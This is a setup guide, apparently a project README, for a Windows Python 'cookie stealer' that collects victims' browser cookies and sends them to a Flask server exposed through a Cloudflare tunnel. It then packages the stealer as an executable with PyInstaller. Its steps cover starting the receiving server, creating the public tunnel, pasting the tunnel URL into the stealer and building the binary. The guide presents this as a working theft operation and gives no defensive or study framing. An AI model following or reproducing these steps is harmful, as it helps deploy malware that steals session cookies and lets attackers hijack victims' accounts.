# Cookie_Stealer



# Setup and Installation Guide

## System Requirements
- Windows Operating System
- Python 3.7 or higher
- Administrator privileges
- Cloudflared installed on the system

---

## Step 1: Install Python Dependencies

Install all required packages using the requirements.txt file:

```bash
pip install -r requirements.txt
```

**Alternatively**, if you have Python 3.11:

```bash
python -m pip install -r requirements.txt
```

### Required packages include:
- Flask
- pycryptodomex
- pywin32
- requests

---

## Step 2: Install Cloudflared

### Option A: Command Prompt Installation (Recommended)

Run the following command in Command Prompt as Administrator:

```bash
choco install cloudflared
```

If you don't have Chocolatey installed, first install it or use Option B.

### Option B: Manual Download and Installation

1. Download Cloudflared from the official Cloudflare website: [https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/)
2. Download the Windows installer (MSI file)
3. Run the installer and follow the installation wizard
4. Verify installation by running:

```bash
cloudflared --version
```

---

## Step 3: Start the Flask Server

Open your **first terminal** and navigate to the project directory:

```bash
cd path\to\02_Python-cookie-stealer
python server.py
```

The server will start on `http://127.0.0.1:9001`

You should see output similar to:
```
 * Serving Flask app 'server'
 * Running on http://127.0.0.1:9001
```

---

## Step 4: Set Up Cloudflare Tunnel

Open your **second terminal** in the same project directory and execute:

```bash
cloudflared tunnel -url 127.0.0.1:9001
```

The terminal will display a public URL similar to:
```
https://example-tunnel-url.trycloudflare.com
```

**Copy this URL** - you will need it in the next step.

---

## Step 5: Configure the Cookie Stealer

1. Open [cookie_stealer.py](cookie_stealer.py) in your preferred text editor
2. Locate line 10 containing: `url = "https://reprints-competitive-parking-scout.trycloudflare.com"`
3. Replace the URL with the one you copied from Step 4:

```python
url = "https://your-cloudflare-tunnel-url.trycloudflare.com"
```

Save the file.

---

## Step 6: Build and Execute

Open a **third terminal** in the project directory and run:

```bash
.\build.bat
```

This command will:
1. Compile the Python stealer into an executable
2. Create a compiled binary file using PyInstaller

The executable will be generated in the build directory.

---

## Execution Flow Summary

| Step | Terminal | Command | Purpose |
|------|----------|---------|---------|
| 1 | Terminal 1 | `python server.py` | Start Flask server |
| 2 | Terminal 2 | `cloudflared tunnel -url 127.0.0.1:9001` | Create secure tunnel |
| 3 | - | Copy Cloudflare URL | Obtain public endpoint |
| 4 | Editor | Update `cookie_stealer.py` | Set server URL |
| 5 | Terminal 3 | `.\build.bat` | Compile executable |

---

## Notes

- Keep both Terminal 1 (server) and Terminal 2 (cloudflared tunnel) running simultaneously
- The server must be active to receive cookie data
- Ensure firewall does not block the Flask server on port 9001
- Administrator privileges may be required for cookie extraction functionality

---

## References
- Video Tutorial: [Youtube](https://youtu.be/sFO3itDY9NM)
- Framework: Flask
- Language: Python
